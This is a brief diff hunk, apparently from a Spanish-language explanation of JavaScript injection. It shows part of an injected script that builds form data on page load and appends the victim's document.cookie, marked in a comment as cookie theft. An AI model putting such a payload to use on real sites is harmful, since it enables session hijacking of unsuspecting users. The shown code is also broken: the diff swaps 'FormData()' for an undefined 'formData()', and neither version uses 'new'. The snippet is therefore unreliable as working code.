@@ -4,7 +4,7 @@ En este caso cuando se inyecta el código JavaScript  el cual se encarga de envi
 
 window.addEventListener('DOMContentLoaded', function(){
 
-var data = FormData();
+var data = formData();
 
 data.append('parametro1', "valor1");
 data.append('parametro2', document.cookie); // <- Robo de cookie
